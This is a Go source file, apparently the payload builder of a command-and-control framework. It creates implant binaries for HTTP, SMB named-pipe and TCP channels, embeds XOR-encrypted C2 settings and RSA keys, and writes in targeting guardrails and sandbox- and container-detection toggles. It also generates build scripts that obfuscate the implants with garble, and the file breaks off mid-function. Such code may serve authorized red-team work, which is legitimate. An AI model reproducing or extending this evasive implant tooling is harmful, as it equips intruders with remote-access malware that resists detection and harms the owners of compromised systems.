// server/internal/builder/websocket/payload.go
package builder

import (
	"c2/internal/common/config"
	"c2/internal/websocket/agent"
	"c2/internal/websocket/hub"
	"c2/internal/websocket/listeners"
	"context"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io"
	"log"
	"math"
	"math/big"
	"os"
	"os/exec"
	"strings"
	"time"

	"github.com/BurntSushi/toml"
	"github.com/docker/docker/api/types/container"
	"github.com/docker/docker/client"

	"github.com/google/uuid"
)

const ChunkSize = 256 * 1024 // Reduced to 256 KB chunks

// SafetyChecks represents the safety check configuration from the client
type SafetyChecks struct {
	Hostname     string        `json:"hostname,omitempty"`
	Username     string        `json:"username,omitempty"`
	Domain       string        `json:"domain,omitempty"`
	FileCheck    *FileCheck    `json:"file_check,omitempty"`
	Process      string        `json:"process,omitempty"`
	KillDate     string        `json:"kill_date,omitempty"`
	WorkingHours *WorkingHours `json:"working_hours,omitempty"`
}

type FileCheck struct {
	Path      string `json:"path"`
	MustExist bool   `json:"must_exist"`
}

type WorkingHours struct {
	Start string `json:"start"`
	End   string `json:"end"`
}

type PayloadConfig struct {
	Sleep       int `toml:"sleep"`
	Jitter      int `toml:"jitter"`
	HTTPHeaders struct {
		UserAgent     string `toml:"user_agent"`
		ContentType   string `toml:"content_type"`
		CustomHeaders []struct {
			Name  string `toml:"name"`
			Value string `toml:"value"`
		} `toml:"custom_headers"`
	} `toml:"http_headers"`
}

// HTTPRouteConfig represents the HTTP route configuration
type HTTPRouteConfig struct {
	GetHandlers []struct {
		Path         string `toml:"path"`
		Method       string `toml:"method"` // NEW: Custom HTTP method (defaults to GET)
		Enabled      bool   `toml:"enabled"`
		AuthRequired bool   `toml:"auth_required"`
		Params       []struct {
			Name   string `toml:"name"`
			Type   string `toml:"type"`
			Format string `toml:"format"`
		} `toml:"params"`
	} `toml:"get_handlers"`
	PostHandlers []struct {
		Path         string `toml:"path"`
		Method       string `toml:"method"` // NEW: Custom HTTP method (defaults to POST)
		Enabled      bool   `toml:"enabled"`
		AuthRequired bool   `toml:"auth_required"`
		Params       []struct {
			Name   string `toml:"name"`
			Type   string `toml:"type"`
			Format string `toml:"format"`
		} `toml:"params"`
	} `toml:"post_handlers"`
}

type PayloadRequest struct {
	Type string `json:"type"`
	Data struct {
		Listener     string       `json:"listener"`
		Language     string       `json:"language"`
		OS           string       `json:"os"`
		Arch         string       `json:"arch"`
		OutputPath   string       `json:"output_path"`
		SafetyChecks SafetyChecks `json:"safety_checks,omitempty"` // Added safety checks
		// SMB-specific options
		PayloadType string `json:"payload_type,omitempty"` // "http", "smb", or "tcp"
		PipeName    string `json:"pipe_name,omitempty"`    // For SMB payloads
		SMBProfile  string `json:"smb_profile,omitempty"`  // SMB profile name for transforms
		// TCP-specific options
		TCPPort    string `json:"tcp_port,omitempty"`    // For TCP payloads
		TCPProfile string `json:"tcp_profile,omitempty"` // TCP profile name for transforms
	} `json:"data"`
}

type KeyPair struct {
	PrivateKeyPEM string
	PublicKeyPEM  string
}

type Builder struct {
	dockerClient    *client.Client
	listenerManager *listeners.Manager
	hubClient       *hub.Hub
	clientUsername  string
	listener        *listeners.Listener
	db              *sql.DB
	agentClient     *agent.Client
	agentConfig     *config.AgentConfig // For profile lookups
}

type PayloadConfigWrapper struct {
	PayloadConfig PayloadConfig   `toml:"payload_config"`
	HTTPRoutes    HTTPRouteConfig `toml:"http_routes"`
}

type buildData struct {
	initID         uuid.UUID
	clientID       uuid.UUID
	secret         string
	keyPair        *KeyPair
	xorKey         string
	binaryName     string
	connectionType string
	os             string
	arch           string
	safetyChecks   SafetyChecks // Added safety checks to build data
	payloadType    string       // "http", "smb", or "tcp"
	pipeName       string       // For SMB payloads
	smbProfile     string       // SMB profile name for transforms
	smbXorKey      string       // Per-build unique XOR key for SMB transforms
	httpXorKey     string       // Per-build unique XOR key for HTTP transforms
	// TCP-specific fields
	tcpPort    string // For TCP payloads
	tcpProfile string // TCP profile name for transforms
	tcpXorKey  string // Per-build unique XOR key for TCP transforms
}

func NewBuilder(manager *listeners.Manager, hubClient *hub.Hub, db *sql.DB, agentClient *agent.Client, agentCfg *config.AgentConfig) (*Builder, error) {
	cli, err := client.NewClientWithOpts(client.FromEnv)
	if err != nil {
		return nil, fmt.Errorf("failed to create docker client: %v", err)
	}

	// Use provided agentConfig for profile lookups (shared with WebSocket handler)
	// This allows dynamically uploaded profiles to be available to the builder
	if agentCfg == nil {
		log.Printf("[Builder] Warning: No agent config provided, loading from file (uploaded profiles may not be available)")
		var err error
		agentCfg, err = config.LoadAgentConfig()
		if err != nil {
			log.Printf("[Builder] Warning: Failed to load agent config for profiles: %v", err)
		}
	}

	return &Builder{
		dockerClient:    cli,
		listenerManager: manager,
		hubClient:       hubClient,
		db:              db,
		agentClient:     agentClient,
		agentConfig:     agentCfg,
	}, nil
}

func (b *Builder) BuildPayload(ctx context.Context, req PayloadRequest, clientUsername string) error {
	go func() {
		if err := b.buildPayloadAsync(ctx, req, clientUsername); err != nil {
			log.Printf("Error building payload: %v", err)
			// Handle any client notification here if needed
		}
	}()
	return nil
}

func (b *Builder) buildPayloadAsync(ctx context.Context, req PayloadRequest, clientUsername string) error {
	if err := b.validateRequest(req); err != nil {
		return err
	}

	listener, exists := b.listenerManager.GetListener(req.Data.Listener)
	if !exists {
		log.Printf("Error: Listener %s not found", req.Data.Listener)
		return fmt.Errorf("listener %s not found", req.Data.Listener)
	}

	log.Printf("Building payload for listener: %s (Protocol=%s, SMBProfile=%s)",
		listener.Name, listener.Protocol, listener.SMBProfile)
	b.clientUsername = clientUsername
	b.listener = listener

	// Log safety checks for audit
	b.logSafetyChecks(req.Data.SafetyChecks, clientUsername, req.Data.Listener)

	// Load configuration
	payloadConfig, err := b.loadPayloadConfig()
	if err != nil {
		return err
	}

	// Initialize build data with OS, arch, and safety checks
	buildData, err := b.initializeBuildData(ctx, req)
	if err != nil {
		return err
	}

	// Register with agent service
	if err := b.registerWithAgentService(ctx, buildData); err != nil {
		return err
	}

	// Check if this is a project export request
	if strings.ToLower(req.Data.Language) == "goproject" {
		log.Printf("Project export requested instead of build")

		// Generate constants.go and write to /shared with safety checks
		if err := b.writeProjectFiles(buildData, payloadConfig); err != nil {
			return err
		}

		// Run container with EXPORT_PROJECT flag to zip instead of compile
		envVars := []string{
			"EXPORT_PROJECT=TRUE",
			fmt.Sprintf("OS=%s", strings.ToLower(buildData.os)),
			fmt.Sprintf("PROJECT_ID=%s", buildData.clientID),
			fmt.Sprintf("OUTPUT_FILENAME=%s_project.zip", strings.TrimSuffix(buildData.binaryName, ".exe")),
		}

		// Add safety check environment variables for project export
		safetyEnvVars := b.prepareSafetyCheckEnvironment(buildData.safetyChecks)
		envVars = append(envVars, safetyEnvVars...)

		zipPath, err := b.buildPayloadBinary(ctx, fmt.Sprintf("%s_project.zip", strings.TrimSuffix(buildData.binaryName, ".exe")), envVars)
		if err != nil {
			return err
		}

		return b.sendAndCleanup(ctx, zipPath)
	}

	// Normal build continues here with safety checks
	envVars, err := b.prepareBuildEnvironment(buildData, payloadConfig)
	if err != nil {
		return err
	}

	// Add safety check environment variables
	safetyEnvVars := b.prepareSafetyCheckEnvironment(buildData.safetyChecks)
	envVars = append(envVars, safetyEnvVars...)

	binaryPath, err := b.buildPayloadBinary(ctx, buildData.binaryName, envVars)
	if err != nil {
		return err
	}

	return b.sendAndCleanup(ctx, binaryPath)
}

// prepareSafetyCheckEnvironment prepares environment variables for safety checks
func (b *Builder) prepareSafetyCheckEnvironment(safetyChecks SafetyChecks) []string {
	var envVars []string

	if safetyChecks.Hostname != "" {
		envVars = append(envVars, fmt.Sprintf("SAFETY_HOSTNAME=%s", safetyChecks.Hostname))
	}

	if safetyChecks.Username != "" {
		envVars = append(envVars, fmt.Sprintf("SAFETY_USERNAME=%s", safetyChecks.Username))
	}

	if safetyChecks.Domain != "" {
		envVars = append(envVars, fmt.Sprintf("SAFETY_DOMAIN=%s", safetyChecks.Domain))
	}

	if safetyChecks.FileCheck != nil && safetyChecks.FileCheck.Path != "" {
		envVars = append(envVars, fmt.Sprintf("SAFETY_FILE_PATH=%s", safetyChecks.FileCheck.Path))
		mustExist := "false"
		if safetyChecks.FileCheck.MustExist {
			mustExist = "true"
		}
		envVars = append(envVars, fmt.Sprintf("SAFETY_FILE_MUST_EXIST=%s", mustExist))
	}

	if safetyChecks.Process != "" {
		envVars = append(envVars, fmt.Sprintf("SAFETY_PROCESS=%s", safetyChecks.Process))
	}

	if safetyChecks.KillDate != "" {
		envVars = append(envVars, fmt.Sprintf("SAFETY_KILL_DATE=%s", safetyChecks.KillDate))
	}

	if safetyChecks.WorkingHours != nil {
		if safetyChecks.WorkingHours.Start != "" {
			envVars = append(envVars, fmt.Sprintf("SAFETY_WORK_HOURS_START=%s", safetyChecks.WorkingHours.Start))
		}
		if safetyChecks.WorkingHours.End != "" {
			envVars = append(envVars, fmt.Sprintf("SAFETY_WORK_HOURS_END=%s", safetyChecks.WorkingHours.End))
		}
	}

	return envVars
}

// logSafetyChecks logs safety checks for audit purposes
func (b *Builder) logSafetyChecks(safetyChecks SafetyChecks, username string, listenerName string) {
	if safetyChecks.Hostname == "" && safetyChecks.Username == "" &&
		safetyChecks.Domain == "" && safetyChecks.FileCheck == nil &&
		safetyChecks.Process == "" && safetyChecks.KillDate == "" &&
		safetyChecks.WorkingHours == nil {
		log.Printf("[AUDIT] Payload for listener %s built by %s with no safety checks", listenerName, username)
		return
	}

	log.Printf("[AUDIT] Payload for listener %s built by %s with safety checks:", listenerName, username)

	if safetyChecks.Hostname != "" {
		log.Printf("  - Hostname: %s", safetyChecks.Hostname)
	}
	if safetyChecks.Username != "" {
		log.Printf("  - Username: %s", safetyChecks.Username)
	}
	if safetyChecks.Domain != "" {
		log.Printf("  - Domain: %s", safetyChecks.Domain)
	}
	if safetyChecks.FileCheck != nil {
		log.Printf("  - File Check: %s (must_exist: %v)",
			safetyChecks.FileCheck.Path, safetyChecks.FileCheck.MustExist)
	}
	if safetyChecks.Process != "" {
		log.Printf("  - Process: %s", safetyChecks.Process)
	}
	if safetyChecks.KillDate != "" {
		log.Printf("  - Kill Date: %s", safetyChecks.KillDate)
	}
	if safetyChecks.WorkingHours != nil {
		log.Printf("  - Working Hours: %s - %s",
			safetyChecks.WorkingHours.Start, safetyChecks.WorkingHours.End)
	}
}

// Updated writeProjectFiles to include safety checks and profile configuration
func (b *Builder) writeProjectFiles(data *buildData, payloadConfig *PayloadConfigWrapper) error {
	// Load malleable config for rekey command (fallback)
	malleableConfig, err := config.GetMalleableConfig()
	if err != nil {
		log.Printf("[Builder] Warning: Failed to load malleable config: %v", err)
	}
	rekeyCommand := "rekey_required" // Default

	// Check if listener has a bound server response profile
	if b.listener.ServerResponseProfile != "" && b.agentConfig != nil {
		responseProfile := b.agentConfig.GetServerResponseProfile(b.listener.ServerResponseProfile)
		if responseProfile != nil && responseProfile.RekeyValue != "" {
			rekeyCommand = responseProfile.RekeyValue
			log.Printf("[Builder] Using server response profile %q rekey command: %q",
				b.listener.ServerResponseProfile, rekeyCommand)
		}
	} else if malleableConfig != nil {
		rekeyCommand = malleableConfig.GetRekeyCommand()
		log.Printf("[Builder] Using malleable rekey command: %q", rekeyCommand)
	}

	// Prepare custom headers JSON
	customHeaders := make(map[string]string)
	for _, header := range payloadConfig.PayloadConfig.HTTPHeaders.CustomHeaders {
		customHeaders[header.Name] = header.Value
	}
	headersJSON, _ := json.Marshal(customHeaders)

	// Extract GET handler details - use bound profile if available
	getMethod := "GET" // Default
	var getRoute string
	var getClientIDParam struct {
		Name   string
		Format string
	}

	// Check if listener has a bound GET profile
	if b.listener.GetProfile != "" && b.agentConfig != nil {
		getProfile := b.agentConfig.GetGetProfile(b.listener.GetProfile)
		if getProfile != nil {
			getRoute = getProfile.Path
			if getProfile.Method != "" {
				getMethod = getProfile.Method
			}
			for _, param := range getProfile.Params {
				if param.Type == "clientID_param" {
					getClientIDParam.Name = param.Name
					getClientIDParam.Format = param.Format
					break
				}
			}
			log.Printf("[Builder] Project export using GET profile %q: path=%s, method=%s",
				b.listener.GetProfile, getRoute, getMethod)
		}
	}

	// Fallback to global routes if no profile matched
	if getRoute == "" {
		for _, handler := range payloadConfig.HTTPRoutes.GetHandlers {
			if handler.Enabled {
				getRoute = handler.Path
				if handler.Method != "" {
					getMethod = handler.Method
				}
				for _, param := range handler.Params {
					if param.Type == "clientID_param" {
						getClientIDParam.Name = param.Name
						getClientIDParam.Format = param.Format
						break
					}
				}
				break
			}
		}
	}

	// Extract POST handler details - use bound profile if available
	postMethod := "POST" // Default
	var postRoute string
	var postClientIDParam struct {
		Name   string
		Format string
	}
	var secretParam struct {
		Name   string
		Format string
	}

	// Check if listener has a bound POST profile
	if b.listener.PostProfile != "" && b.agentConfig != nil {
		postProfile := b.agentConfig.GetPostProfile(b.listener.PostProfile)
		if postProfile != nil {
			postRoute = postProfile.Path
			if postProfile.Method != "" {
				postMethod = postProfile.Method
			}
			for _, param := range postProfile.Params {
				switch param.Type {
				case "clientID_param":
					postClientIDParam.Name = param.Name
					postClientIDParam.Format = param.Format
				case "secret_param":
					secretParam.Name = param.Name
					secretParam.Format = param.Format
				}
			}
			log.Printf("[Builder] Project export using POST profile %q: path=%s, method=%s",
				b.listener.PostProfile, postRoute, postMethod)
		}
	}

	// Fallback to global routes if no profile matched
	if postRoute == "" {
		for _, handler := range payloadConfig.HTTPRoutes.PostHandlers {
			if handler.Enabled {
				postRoute = handler.Path
				if handler.Method != "" {
					postMethod = handler.Method
				}
				for _, param := range handler.Params {
					switch param.Type {
					case "clientID_param":
						postClientIDParam.Name = param.Name
						postClientIDParam.Format = param.Format
					case "secret_param":
						secretParam.Name = param.Name
						secretParam.Format = param.Format
					}
				}
				break
			}
		}
	}

	log.Printf("Project export with HTTP methods: GET=%s, POST=%s", getMethod, postMethod)
	log.Printf("Project export with profiles: GET=%s, POST=%s, Response=%s",
		b.listener.GetProfile, b.listener.PostProfile, b.listener.ServerResponseProfile)

	// Values that should be encrypted (matching prepareBuildEnvironment)
	encryptedValues := map[string]string{
		"publicKey":          data.keyPair.PublicKeyPEM,
		"secret":             data.secret,
		"protocol":           b.listener.Protocol,
		"ip":                 b.listener.IP,
		"port":               fmt.Sprintf("%d", b.listener.Port),
		"getMethod":          getMethod,
		"postMethod":         postMethod,
		"userAgent":          payloadConfig.PayloadConfig.HTTPHeaders.UserAgent,
		"contentType":        payloadConfig.PayloadConfig.HTTPHeaders.ContentType,
		"customHeaders":      string(headersJSON),
		"getRoute":           getRoute,
		"postRoute":          postRoute,
		"getClientIDName":    getClientIDParam.Name,
		"getClientIDFormat":  getClientIDParam.Format,
		"postClientIDName":   postClientIDParam.Name,
		"postClientIDFormat": postClientIDParam.Format,
		"postSecretName":     secretParam.Name,
		"postSecretFormat":   secretParam.Format,
	}

	// Encrypt all values including the methods
	for k, v := range encryptedValues {
		encryptedValues[k] = xorEncrypt(v, data.xorKey)
	}

	// Build safety check comment for documentation
	safetyCheckComment := ""
	if data.safetyChecks.Hostname != "" || data.safetyChecks.Username != "" ||
		data.safetyChecks.Domain != "" || data.safetyChecks.FileCheck != nil ||
		data.safetyChecks.Process != "" || data.safetyChecks.KillDate != "" ||
		data.safetyChecks.WorkingHours != nil {
		safetyCheckComment = "\n// Safety Checks Configured:"
		if data.safetyChecks.Hostname != "" {
			safetyCheckComment += fmt.Sprintf("\n// - Hostname: %s", data.safetyChecks.Hostname)
		}
		if data.safetyChecks.Username != "" {
			safetyCheckComment += fmt.Sprintf("\n// - Username: %s", data.safetyChecks.Username)
		}
		if data.safetyChecks.Domain != "" {
			safetyCheckComment += fmt.Sprintf("\n// - Domain: %s", data.safetyChecks.Domain)
		}
		if data.safetyChecks.FileCheck != nil {
			safetyCheckComment += fmt.Sprintf("\n// - File: %s (must_exist: %v)",
				data.safetyChecks.FileCheck.Path, data.safetyChecks.FileCheck.MustExist)
		}
		if data.safetyChecks.Process != "" {
			safetyCheckComment += fmt.Sprintf("\n// - Process: %s", data.safetyChecks.Process)
		}
		if data.safetyChecks.KillDate != "" {
			safetyCheckComment += fmt.Sprintf("\n// - Kill Date: %s", data.safetyChecks.KillDate)
		}
		if data.safetyChecks.WorkingHours != nil {
			safetyCheckComment += fmt.Sprintf("\n// - Working Hours: %s - %s",
				data.safetyChecks.WorkingHours.Start, data.safetyChecks.WorkingHours.End)
		}
	}

	// Create init_variables.go with safety checks included
	initContent := fmt.Sprintf(`package main

// Auto-generated for project export
// Generated: %s
// Target: %s/%s
// HTTP Methods: GET=%s, POST=%s%s
// XOR Key is embedded for decryption at runtime

// Declare variables that will be set
var (
	// Non-encrypted values
	xorKey   string
	clientID string
	sleep    string
	jitter   string

	// Encrypted values
	getMethod          string
	postMethod         string
	userAgent          string
	contentType        string
	customHeaders      string
	getRoute           string
	postRoute          string
	getClientIDName    string
	getClientIDFormat  string
	postClientIDName   string
	postClientIDFormat string
	postSecretName     string
	postSecretFormat   string
	publicKey          string
	secret             string
	protocol           string
	ip                 string
	port               string

	// Safety check variables
	safetyHostname       string = "%s"
	safetyUsername       string = "%s"
	safetyDomain         string = "%s"
	safetyFilePath       string = "%s"
	safetyFileMustExist  string = "%s"
	safetyProcess        string = "%s"
	safetyKillDate       string = "%s"
	safetyWorkHoursStart string = "%s"
	safetyWorkHoursEnd   string = "%s"

	// Toggle variables
	toggleCheckEnvironment     string
	toggleCheckTimeDiscrepancy string
	toggleCheckMemoryPatterns  string
	toggleCheckParentProcess   string
	toggleCheckLoadedLibraries string
	toggleCheckDockerContainer string
	toggleCheckProcessList     string
)

func init() {
	// Set non-encrypted values
	xorKey = "%s"
	clientID = "%s"
	sleep = "%d"
	jitter = "%d"
	
	// Set encrypted values (these are XOR encrypted and base64 encoded)
	getMethod = "%s"
	postMethod = "%s"
	userAgent = "%s"
	contentType = "%s"
	customHeaders = "%s"
	getRoute = "%s"
	postRoute = "%s"
	getClientIDName = "%s"
	getClientIDFormat = "%s"
	postClientIDName = "%s"
	postClientIDFormat = "%s"
	postSecretName = "%s"
	postSecretFormat = "%s"
	publicKey = "%s"
	secret = "%s"
	protocol = "%s"
	ip = "%s"
	port = "%s"
}
`,
		time.Now().Format(time.RFC3339),
		data.os, data.arch,
		getMethod, postMethod,
		safetyCheckComment,
		// Safety check values
		data.safetyChecks.Hostname,
		data.safetyChecks.Username,
		data.safetyChecks.Domain,
		func() string {
			if data.safetyChecks.FileCheck != nil {
				return data.safetyChecks.FileCheck.Path
			}
			return ""
		}(),
		func() string {
			if data.safetyChecks.FileCheck != nil && data.safetyChecks.FileCheck.MustExist {
				return "true"
			}
			return "false"
		}(),
		data.safetyChecks.Process,
		data.safetyChecks.KillDate,
		func() string {
			if data.safetyChecks.WorkingHours != nil {
				return data.safetyChecks.WorkingHours.Start
			}
			return ""
		}(),
		func() string {
			if data.safetyChecks.WorkingHours != nil {
				return data.safetyChecks.WorkingHours.End
			}
			return ""
		}(),
		// Regular values
		data.xorKey,
		data.clientID,
		payloadConfig.PayloadConfig.Sleep,
		payloadConfig.PayloadConfig.Jitter,
		encryptedValues["getMethod"],
		encryptedValues["postMethod"],
		encryptedValues["userAgent"],
		encryptedValues["contentType"],
		encryptedValues["customHeaders"],
		encryptedValues["getRoute"],
		encryptedValues["postRoute"],
		encryptedValues["getClientIDName"],
		encryptedValues["getClientIDFormat"],
		encryptedValues["postClientIDName"],
		encryptedValues["postClientIDFormat"],
		encryptedValues["postSecretName"],
		encryptedValues["postSecretFormat"],
		encryptedValues["publicKey"],
		encryptedValues["secret"],
		encryptedValues["protocol"],
		encryptedValues["ip"],
		encryptedValues["port"],
	)

	// Write init_variables.go
	if err := os.WriteFile(fmt.Sprintf("/shared/%s_init_variables.go", data.clientID), []byte(initContent), 0644); err != nil {
		return err
	}

	// Determine binary extension
	binaryExt := ""
	if data.os == "windows" {
		binaryExt = ".exe"
	}

	// Create build script with note about custom methods and safety checks
	buildScriptContent := fmt.Sprintf(`#!/bin/bash
# Build script for payload - matches production build settings
# Target: %s/%s
# HTTP Methods: GET=%s, POST=%s
# Generated: %s
%s

OUTPUT_NAME="payload_%s_%s%s"
if [ "$1" != "" ]; then
    OUTPUT_NAME="$1"
fi

echo "Building for %s/%s..."
echo "Using HTTP methods: GET=%s, POST=%s"
echo "Malleable rekey command: %s"

# Check if garble is installed
if ! command -v garble &> /dev/null; then
    echo "Warning: garble not found, building without obfuscation"
    GOOS=%s GOARCH=%s go build \
        -ldflags="-w -s -buildid= -X 'main.MALLEABLE_REKEY_COMMAND=%s'" \
        -trimpath \
        -o "${OUTPUT_NAME}" \
        *.go
else
    echo "Building with garble obfuscation..."
    GOOS=%s GOARCH=%s garble -seed=random -literals -tiny -debugdir=none build \
        -ldflags="-w -s -buildid= -X 'main.MALLEABLE_REKEY_COMMAND=%s'" \
        -trimpath \
        -o "${OUTPUT_NAME}" \
        *.go
fi

if [ $? -eq 0 ]; then
    echo "Build successful: ${OUTPUT_NAME}"
    ls -lh "${OUTPUT_NAME}"
else
    echo "Build failed"
    exit 1
fi
`,
		data.os, data.arch,
		getMethod, postMethod,
		time.Now().Format(time.RFC3339),
		strings.ReplaceAll(safetyCheckComment, "// ", "# "),
		data.os, data.arch, binaryExt,
		data.os, data.arch,
		getMethod, postMethod,
		rekeyCommand,
		data.os, data.arch,
		rekeyCommand,
		data.os, data.arch,
		rekeyCommand,
	)

	if err := os.WriteFile(fmt.Sprintf("/shared/%s_build.sh", data.clientID), []byte(buildScriptContent), 0755); err != nil {
		return err
	}

	// Create Makefile with custom methods and safety checks noted
	makefileContent := fmt.Sprintf(`# Makefile for payload project
# Target: %s/%s
# HTTP Methods: GET=%s, POST=%s
# Malleable Rekey Command: %s
%s

BINARY_NAME = payload_%s_%s%s
GOOS = %s
GOARCH = %s
LDFLAGS = -w -s -buildid= -X 'main.MALLEABLE_REKEY_COMMAND=%s'
GARBLE_FLAGS = -seed=random -literals -tiny -debugdir=none

.PHONY: all build build-garble clean info

all: build

info:
	@echo "Build configuration:"
	@echo "  Target OS: $(GOOS)"
	@echo "  Target Arch: $(GOARCH)"
	@echo "  GET Method: %s"
	@echo "  POST Method: %s"

# Standard build without obfuscation
build:
	GOOS=$(GOOS) GOARCH=$(GOARCH) go build -ldflags="$(LDFLAGS)" -trimpath -o $(BINARY_NAME) *.go

# Build with garble obfuscation
build-garble:
	GOOS=$(GOOS) GOARCH=$(GOARCH) garble $(GARBLE_FLAGS) build -ldflags="$(LDFLAGS)" -trimpath -o $(BINARY_NAME) *.go

clean:
	rm -f $(BINARY_NAME) $(BINARY_NAME).exe

help:
	@echo "Available targets:"
	@echo "  make info          - Show build configuration"
	@echo "  make build         - Build without obfuscation"
	@echo "  make build-garble  - Build with garble obfuscation"
	@echo "  make clean         - Remove built binaries"
`,
		data.os, data.arch,
		getMethod, postMethod,
		rekeyCommand,
		strings.ReplaceAll(safetyCheckComment, "// ", "# "),
		data.os, data.arch, binaryExt,
		data.os, data.arch,
		rekeyCommand,
		getMethod, postMethod,
	)

	if err := os.WriteFile(fmt.Sprintf("/shared/%s_Makefile", data.clientID), []byte(makefileContent), 0644); err != nil {
		return err
	}

	// Windows batch file if target is Windows
	if data.os == "windows" {
		buildBatContent := fmt.Sprintf(`@echo off
REM Build script for Windows payload
REM Target: %s/%s
REM HTTP Methods: GET=%s, POST=%s
REM Malleable Rekey Command: %s
%s

set OUTPUT_NAME=payload_%s_%s.exe
if NOT "%%1"=="" set OUTPUT_NAME=%%1

echo Building for %s/%s...
echo Using HTTP methods: GET=%s, POST=%s
echo Malleable rekey command: %s

REM Check if garble exists
where garble >nul 2>nul
if %%ERRORLEVEL%% NEQ 0 (
    echo Warning: garble not found, building without obfuscation
    set GOOS=%s
    set GOARCH=%s
    go build -ldflags="-w -s -buildid= -X 'main.MALLEABLE_REKEY_COMMAND=%s'" -trimpath -o "%%OUTPUT_NAME%%" *.go
) else (
    echo Building with garble obfuscation...
    set GOOS=%s
    set GOARCH=%s
    garble -seed=random -literals -tiny -debugdir=none build -ldflags="-w -s -buildid= -X 'main.MALLEABLE_REKEY_COMMAND=%s'" -trimpath -o "%%OUTPUT_NAME%%" *.go
)

if %%errorlevel%% equ 0 (
    echo Build successful: %%OUTPUT_NAME%%
    dir "%%OUTPUT_NAME%%"
) else (
    echo Build failed
    exit /b 1
)
`,
			data.os, data.arch,
			getMethod, postMethod,
			rekeyCommand,
			strings.ReplaceAll(safetyCheckComment, "// ", "REM "),
			data.os, data.arch,
			data.os, data.arch,
			getMethod, postMethod,
			rekeyCommand,
			data.os, data.arch,
			rekeyCommand,
			data.os, data.arch,
			rekeyCommand,
		)

		if err := os.WriteFile(fmt.Sprintf("/shared/%s_build.bat", data.clientID), []byte(buildBatContent), 0644); err != nil {
			return err
		}
	}

	return nil
}

func (b *Builder) loadPayloadConfig() (*PayloadConfigWrapper, error) {
	var config PayloadConfigWrapper
	if _, err := toml.DecodeFile("/app/config.toml", &config); err != nil {
		return nil, fmt.Errorf("failed to load payload config: %v", err)
	}
	return &config, nil
}

func (b *Builder) initializeBuildData(ctx context.Context, req PayloadRequest) (*buildData, error) {
	keyPair, err := GenerateRSAKeyPair()
	if err != nil {
		return nil, fmt.Errorf("failed to generate key pair: %v", err)
	}

	clientID := uuid.New()
	secret, err := GenerateRandomString(24)
	if err != nil {
		return nil, fmt.Errorf("failed to generate secret: %v", err)
	}

	xorKey, err := GenerateRandomString(16)
	if err != nil {
		return nil, fmt.Errorf("failed to generate XOR key: %v", err)
	}

	// Generate SMB-specific XOR key for transform encryption (per-build unique)
	// This replaces the static XOR key from config.toml for better security
	smbXorKey, err := GenerateRandomString(12)
	if err != nil {
		return nil, fmt.Errorf("failed to generate SMB XOR key: %v", err)
	}

	// Generate TCP-specific XOR key for transform encryption (per-build unique)
	tcpXorKey, err := GenerateRandomString(12)
	if err != nil {
		return nil, fmt.Errorf("failed to generate TCP XOR key: %v", err)
	}

	// HTTP profiles use static XOR keys from config.toml (no per-build keys)
	// This simplifies the implementation - agent and server both use profile's static key
	var httpXorKey string // Empty - not used for HTTP, kept for struct compatibility

	// Determine payload type from listener protocol if not explicitly set
	// This allows the UI to just select a listener and the server determines the payload type
	listenerProtocol := strings.ToUpper(b.listener.Protocol)
	payloadType := strings.ToLower(req.Data.PayloadType)

	// Auto-detect payload type based on listener protocol
	if payloadType == "" {
		switch listenerProtocol {
		case "SMB":
			payloadType = "smb"
			log.Printf("[Builder] Auto-detected SMB payload type from listener protocol")
		case "TCP":
			payloadType = "tcp"
			log.Printf("[Builder] Auto-detected TCP payload type from listener protocol")
		default:
			payloadType = "http" // Default to HTTP for HTTP/HTTPS/RPC
		}
	}

	connectionType := "edge"
	if payloadType == "smb" || payloadType == "tcp" || listenerProtocol == "SMB" || listenerProtocol == "TCP" || listenerProtocol == "RPC" {
		connectionType = "link"
	}

	// Set pipe name - use listener's pipe name if available, then request pipe name, then default
	pipeName := req.Data.PipeName
	if pipeName == "" && b.listener.PipeName != "" {
		pipeName = b.listener.PipeName
		log.Printf("[Builder] Using pipe name from listener: %s", pipeName)
	}
	if payloadType == "smb" && pipeName == "" {
		pipeName = "spoolss" // Default pipe name
		log.Printf("[Builder] Using default pipe name: spoolss")
	}

	// Set TCP port - use listener's port first, then request port, then default
	tcpPort := req.Data.TCPPort
	if payloadType == "tcp" {
		// First priority: use listener's port (from database)
		if b.listener != nil && b.listener.Port > 0 {
			tcpPort = fmt.Sprintf("%d", b.listener.Port)
			log.Printf("[Builder] Using listener's TCP port: %s", tcpPort)
		} else if tcpPort == "" {
			tcpPort = "4444" // Default TCP port
			log.Printf("[Builder] Using default TCP port: 4444")
		}
	}

	binaryName := b.generateBinaryName(req)
	initID := uuid.New()

	log.Printf("[Builder] Initializing build data - payload_type=%s, connection_type=%s, pipe_name=%s, tcp_port=%s",
		payloadType, connectionType, pipeName, tcpPort)

	data := &buildData{
		initID:         initID,
		clientID:       clientID,
		secret:         secret,
		keyPair:        keyPair,
		xorKey:         xorKey,
		binaryName:     binaryName,
		connectionType: connectionType,
		os:             strings.ToLower(req.Data.OS),
		arch:           req.Data.Arch,
		safetyChecks:   req.Data.SafetyChecks, // Store safety checks
		payloadType:    payloadType,
		pipeName:       pipeName,
		smbProfile:     req.Data.SMBProfile, // SMB profile for transforms
		smbXorKey:      smbXorKey,           // Per-build unique XOR key for SMB transforms
		httpXorKey:     httpXorKey,          // Per-build unique XOR key for HTTP transforms
		tcpPort:        tcpPort,             // TCP port for TCP payloads
		tcpProfile:     req.Data.TCPProfile, // TCP profile for transforms
		tcpXorKey:      tcpXorKey,           // Per-build unique XOR key for TCP transforms
	}

	// Fall back to listener's SMB profile if not specified in the request
	log.Printf("[Builder] SMB profile from request: '%s', listener SMBProfile: '%s'",
		req.Data.SMBProfile, b.listener.SMBProfile)
	if data.smbProfile == "" && b.listener != nil {
		data.smbProfile = b.listener.SMBProfile
		if data.smbProfile != "" {
			log.Printf("[Builder] Using listener's SMB profile: %s", data.smbProfile)
		} else if payloadType == "smb" {
			log.Printf("[Builder] WARNING: Listener has no SMB profile set, transforms will not be embedded")
		}
	}

	// Fall back to listener's TCP profile if not specified in the request
	if data.tcpProfile == "" && b.listener != nil && b.listener.TCPProfile != "" {
		data.tcpProfile = b.listener.TCPProfile
		log.Printf("[Builder] Using listener's TCP profile: %s", data.tcpProfile)
	}

	// Store in database
	if err := b.storeBuildData(ctx, data); err != nil {
		return nil, err
	}

	return data, nil
}

func (b *Builder) generateBinaryName(req PayloadRequest) string {
	timestamp := time.Now().Format("20060102_150405")
	fileExtension := ".bin"
